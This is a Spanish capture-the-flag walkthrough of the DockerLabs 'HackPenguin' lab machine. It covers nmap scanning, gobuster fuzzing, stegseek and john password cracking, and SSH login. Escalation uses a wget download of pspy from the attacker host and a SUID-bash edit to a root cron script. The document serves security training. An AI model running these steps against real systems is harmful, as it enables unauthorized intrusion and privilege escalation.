# [HackPenguin](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh hackpenguin.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).


## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)

`-c 1` ⮞ solo lo repite una vez

<br>

Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que están abiertos los puertos **22** y **80**.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/6cfd1d77-2a62-4269-86e9-1892ca713d92)

<br>
<br>

## Página Web (Puerto 80)

Al ver que aloja un servidor web, nos dirigimos a él poniendo en el buscador la ip que en este caso sería `172.17.0.2:`. Observamos la página por defecto de `Apache 2`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/a7adc3b7-b774-4c98-b19d-e9797b849b82)

<br>

### Gobuster

Si inspeccionamos el Código Fuente con `CTRL + U`, no encontraremos nada por lo que haremos un fuzzing `gobuster dir -w /home/kali/WordLists/directory-medium -u http://172.17.0.2 -x txt,sql,py,js,php,html`, nos detecta lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/eb5be65a-30b1-47a7-ac56-dd7dae1e9d62)

<br>

Nos dirigimos al archivo `penguin.html`, y vemos lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/9a649e71-8949-4a42-9fe3-2dbd730a7bcc)

<br>

### Estenografía

Probaremos a descargarnos la imagen y ver si se esconde algún archivo detrás de esta.
<br>

Usaremos `steghide` de la siguiente forma `steghide extract -sf penguin.jpg` pero como lo tenemos la passphrase no podremos extraerlo:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/f9a94c4a-53ea-4e43-99fc-ba3d596995fb)

<br>

Por lo que usaremos `stegseek` para crackear la passphrase, pondremos `stegseek --crack penguin.png /usr/share/wordlists/rockyou.txt output.txt`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/d78de110-22d0-4bde-a93a-81642088ad53)

<br>

Vemos que detrás de la imagen se encontraba un archivo con extensión `.kdbx` (KeePass), y la passphrase era `chocolate`. Si probamos ha abrir el archivo con `keepassxc penguin.kdbx` y de contraseña ponemos `chocolate`, nos dará error:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/aa5708a1-7e32-41cd-9842-b339f4861155)

<br>

Por lo que probaremos a crackear la contraseña del archivo de KeePass `penguin.kdbx`, usaremos `keepass2john penguin.kdbx > hash`. Una vez tenemos el hash, haremos `john hash --wordlist=/usr/share/wordlists/rockyou.txt`, y tendremos el siguiente output:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/b2bb8227-8bf4-4271-a701-36b473797c46)

<br>

Una vez crackeada la contraseña, abrimos el archivo de KeePass con `keepassxc penguin.kdbx`, introducimos la contraseña **password1**, y nos sale lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/364b963b-d2c4-4c5c-841d-714560b5d97e)

<br>
<br>

## SSH (Puerto 22)

Por lo que una vez que tenemos un posible usuario **pinguino** y una contraseña **pinguinomaravilloso123**, probamos a autenticarnos por `ssh` de la siguiente forma `ssh pinguino@172.17.0.2`, introducimos la contraseña pero nos dará error.
Pero si observamos en Keepass arriba a la derecha, parece que hay un grupo de usuarios llamado **penguin**:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/b4f72b59-cc53-4554-8847-a38df4c1d4e6)

<br>

Entonces, probamos a autenticarnos con el grupo penguin `ssh penguin@172.17.0.2`, introducimos la contraseña y listo ya estamos dentro de la máquina HackPenguin:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/a5396f7c-1041-406b-9219-b74f6d102516)

<br>
<br>

## Escalada de Privilegios

No es necesario el tratamiento de la TTY escribimos `bash` y ya podemos operar cómodamente.

Ejecutamos el comando `sudo -l` para ver que podemos ejecutar como sudo, pero no encontramos nada: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/4dd9b7fc-b91c-44a0-baee-0eb9a7ae35a9)

<br>

Al igual que si ejecutamos `find / -perm -4000 2>/dev/null` en búsqueda de permisos SUID no encontramos nada potencial para escalar privilegios. 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/b9ba849c-cd57-4270-97d8-acd6e14ea0b1)

`/` ⮞ buscamos desde la raíz <br>
`-perm -4000` ⮞ mostrar los permisos SUID <br>
`2>/dev/null` ⮞ para que no nos muestre los errores 

<br>

Dado que no hemos encontrado nada pasaremos a intentar buscar algún archivo con información, y en el directorio personal de penguin (`/home/penguin`), encontramos lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/fded3f82-66c7-4e90-aa0e-877fd8be3f94)

<br>

Si vemos el contenido de estos, encontraremos lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/f9199a0a-5857-44e1-840a-35402ca2c816)

<br>

Ahora vamos a ver los procesos en ejecución para ello usaremos la herramienta [pspy64](https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64), nos la compartimos con la máquina víctima con python `python3 -m http.server`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/05db4342-0ab3-4a50-a163-85eccdd28aa9)

<br>

Y en la máquina víctima usaremos `wget 172.17.0.1/pspy64`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/12279c83-d07b-406c-9a2a-da5647012062)

<br>

Le damos permisos de ejecución `chmod +x pspy64`, y lo ejecutamos `./pspy64`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/6efe3a84-bb05-4c1f-a064-7d50cdb92139)

<br>

Vemos que el usuario root esta ejecutando todo el rato el archivo `script.sh`, y como tenemos permiso de modificación sobre dicho archivo:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/de374552-32ca-44e2-bc90-39095084a83e)

<br>

Pasaremos a modificar su contenido y añadiremos la siguiente línea:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/ba2b368d-fc4d-4e44-8445-d486b5d59ba1)

<br>

Lo que hace está línea es otorgar permisos SUID a la `/bin/bash`, comprobamos que los tiene:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/fe0dbfea-b3b3-48b7-b849-15bb58b35e1d)

<br>

Una vez que la `/bin/bash` tiene permisos SUID, ejecutaremos `/bin/bash -p` y listo ya somos **root!** 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/eb44cc6f-d165-4b29-99d6-2005e5f29819)